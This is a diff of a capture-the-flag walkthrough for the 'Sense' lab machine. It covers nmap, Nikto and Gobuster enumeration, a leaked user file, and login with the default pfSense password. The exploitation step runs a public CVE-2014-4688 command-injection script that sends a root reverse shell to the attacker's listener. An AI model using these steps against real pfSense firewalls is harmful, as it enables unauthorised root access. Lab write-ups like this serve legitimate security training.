@@ -1,123 +1,105 @@
 # Sense
 
 ## Information Gathering
+Sense<br>
 10.10.10.60<br>
-Sense
 
-## Recon
-Start with nmap scan:<br>
+Software Versions
+- lighttpd 1.4.35
+- pfsense 2.1.3-RELEASE
+- FreeBSD 8.3-RELEASE-p16
+
+## Enumeration
+Of course, start with an nmap scan.
 ```bash
-# Nmap 7.92 scan initiated Mon Feb  7 19:21:52 2022 as: nmap -sC -sV -oN nmap/sense.nmap 10.10.10.60
+# Nmap 7.92 scan initiated Sun Feb 20 22:47:37 2022 as: nmap -p- -A -oN nmap/sense.nmap -Pn 10.10.10.60
 Nmap scan report for 10.10.10.60
-Host is up (0.093s latency).
-Not shown: 998 filtered tcp ports (no-response)
+Host is up (0.028s latency).
+Not shown: 65533 filtered tcp ports (no-response)
 PORT    STATE SERVICE  VERSION
 80/tcp  open  http     lighttpd 1.4.35
 |_http-title: Did not follow redirect to https://10.10.10.60/
 |_http-server-header: lighttpd/1.4.35
 443/tcp open  ssl/http lighttpd 1.4.35
-|_http-title: Login
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: lighttpd/1.4.35
 | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
 | Not valid before: 2017-10-14T19:21:35
 |_Not valid after:  2023-04-06T19:21:35
-|_ssl-date: TLS randomness does not represent time
-|_http-server-header: lighttpd/1.4.35
+|_http-title: Login
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: specialized|general purpose
+Running (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%)
+OS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3
+Aggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Mon Feb  7 19:22:26 2022 -- 1 IP address (1 host up) scanned in 33.53 seconds
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   27.72 ms 10.10.14.1
+2   27.73 ms 10.10.10.60
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Feb 20 22:50:14 2022 -- 1 IP address (1 host up) scanned in 157.11 seconds
+
 ```
-Going to the http server automatically redirects us to the https server. I begin directory busting and running a quick nikto scan:<br>
+Taking a look at the HTTP server automatically redirects you to the HTTPS server. I'll start with a Nikto scan:
 ```bash
 - Nikto v2.1.6/2.1.5
 + Target Host: 10.10.10.60
-+ Target Port: 80
-+ GET The anti-clickjacking X-Frame-Options header is not present.
++ Target Port: 443
 + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ GET The site uses SSL and Expect-CT header is not present.
 + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ GET Cookie PHPSESSID created without the httponly flag
++ GET Cookie cookie_test created without the secure flag
++ GET Cookie cookie_test created without the httponly flag
++ GET Multiple index files found: /index.php, /index.html
++ GET Hostname '10.10.10.60' does not match certificates names: Common
 + OPTIONS Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+
 ```
-And the results from dirbuster:<br>
+And a Gobuster scan
+```bash
+/index.html           (Status: 200) [Size: 329]
+/help.php             (Status: 200) [Size: 6689]
+/index.php            (Status: 200) [Size: 6690]
+/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
+/stats.php            (Status: 200) [Size: 6690]
+/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
+/edit.php             (Status: 200) [Size: 6689]
+/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
+/system.php           (Status: 200) [Size: 6691]
+/license.php          (Status: 200) [Size: 6692]
+/status.php           (Status: 200) [Size: 6691]
+/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
+/changelog.txt        (Status: 200) [Size: 271]
+/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
+/exec.php             (Status: 200) [Size: 6689]
+/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
+/graph.php            (Status: 200) [Size: 6690]
+/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
+/wizard.php           (Status: 200) [Size: 6691]
+/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
+/pkg.php              (Status: 200) [Size: 6688]
+/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
+/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
+/xmlrpc.php           (Status: 200) [Size: 384]
+/reboot.php           (Status: 200) [Size: 6691]
+/interfaces.php       (Status: 200) [Size: 6695]
+/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
+/system-users.txt     (Status: 200) [Size: 106]
+/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
+
 ```
-DirBuster 1.0-RC1 - Report
-http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
-Report produced on Mon Feb 07 20:14:13 EST 2022
---------------------------------
-
-https://10.10.10.60:443
---------------------------------
-Directories found during testing:
-
-Dirs found with a 200 response:
-
-/
-/tree/
-
-Dirs found with a 302 response:
-
-/installer/
-
-
---------------------------------
-Files found during testing:
-
-Files found with a 200 responce:
-
-/index.html
-/index.php
-/help.php
-/stats.php
-/themes/pfsense_ng/javascript/niftyjsCode.js
-/csrf/csrf-magic.js
-/javascript/jquery.js
-/edit.php
-/license.php
-/system.php
-/status.php
-/changelog.txt
-/exec.php
-/graph.php
-/tree/index.html
-/tree/tree.js
-/wizard.php
-/pkg.php
-/system-users.txt
-
-Files found with a 302 responce:
-
-/installer/index.php
-
---------------------------------
-```
-Looking at Changelog.txt shows the following:
-```
-# Security Changelog 
-
-### Issue
-There was a failure in updating the firewall. Manual patching is therefore required
-
-### Mitigated
-2 of 3 vulnerabilities have been patched.
-
-### Timeline
-The remaining patches will be installed during the next maintenance window
-```
-There is also a text file system-users.txt which contains credentials
-```
-####Support ticket###
-
-Please create the following user
-
-
-username: Rohit
-password: company defaults
-```
-Now that we are authenticated, I can see the version of pfsense that is running. I can also see what version of OpenBSD is running on the server
-<ul>
-	<li>pfsense 2.1.3-RELEASE</li>
-	<li>FreeBSD 8.3-RELEASE-p16</li>
-</ul>
 
 ## Exploitation
-There are a few exploits in Metasploit for this. I use the <b>exploit/unix/http/pfsense_graph_injection_exec</b> which drops you directly into a root shell getting you both user and root flags.
+Looking at the Gobuster results, there is a file called "system-users.txt". Inside this file leaks a user and tells us that the password is the default password for the company. Doing a bit of Googling reveals that the default password for pfsense is "pfsense". <b>rohit:pfsense</b> authenticates us. Once we are logged in, a bunch of system info is given to us including the version of pfsense and the version of FreeBSD being used.<br> 
+A CVE is associate with this webapp: CVE-2014-4688. There is also this PoC: https://www.exploit-db.com/exploits/43560. Running this script gives a root shell. Don't forget to start your netcat listener.
+```bash
+/command_injection.py --rhost 10.10.10.60:443 --lhost 10.10.14.122 --lport 1337 --username rohit --password pfsense
 
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+```
